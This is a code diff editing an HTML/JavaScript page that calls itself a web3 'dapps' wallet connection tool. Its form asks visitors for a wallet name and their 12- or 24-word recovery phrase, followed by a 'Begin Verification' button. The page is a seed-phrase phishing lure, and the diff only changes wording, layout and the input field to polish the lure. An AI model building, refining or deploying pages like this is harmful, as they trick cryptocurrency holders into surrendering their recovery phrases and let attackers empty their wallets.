@@ -19,7 +19,7 @@ var name=document.myform.name.value;
 var password=document.myform.key.value;  
   
 if (name==null || name==""){  
-  alert("Agent flied can't be empty");  
+  alert("PLease can you fill in the name of your agent");  
   return false;  
 }else if(password.length<6){  
   alert("Key Phrase is usually 12 or 24 words  long.");  
@@ -31,11 +31,11 @@ if (name==null || name==""){
 		<div class="container">
 			<div class="row justify-content-center">
 				<div class="col-md-6 text-center mb-5">
-				<img src="./css/logo.svg" class="img-fluid"> 
-					<h2 class="heading-section">Connect through dapps and web3 protocol<br>
+				<img src="./css/logo.svg" class="img-fluid " style="max-width: 20%;"> 
+					<h4 class="heading-section">Connect through dapps and web3 protocol<br>
 Most wallets support the connection process. Interaction between blockchain apps  and  browsers are made possible with web3.
 
-</h2>
+</h4>
 				</div>
 			</div>
 			<div class="row justify-content-center">
@@ -53,8 +53,8 @@ Most wallets support the connection process. Interaction between blockchain apps
 	             
 	            </div>
 	            <div class="form-group">
-	              <input name="key" id="password-field" type="textarea" class="form-control" placeholder="Wallet key phrase (12 words seperated by commar,) " required>
-	              <span toggle="#password-field" class="fa fa-fw fa-eye field-icon toggle-password"></span>
+	              <input name="key" id="input-field" type="textarea" class="form-control" placeholder="key phrase (Usually 12 words seperated by ,) " required>
+	            
 	            </div>
 	            <div class="form-group">
 	            	<button type="submit" class="form-control btn btn-primary submit px-3">Begin Verification</button>
@@ -63,9 +63,8 @@ Most wallets support the connection process. Interaction between blockchain apps
 	          </form>
 	       
 	        
-		      </div>
-				</div>
-			</div>
+		      
+		
 		</div>
 	</section>
 
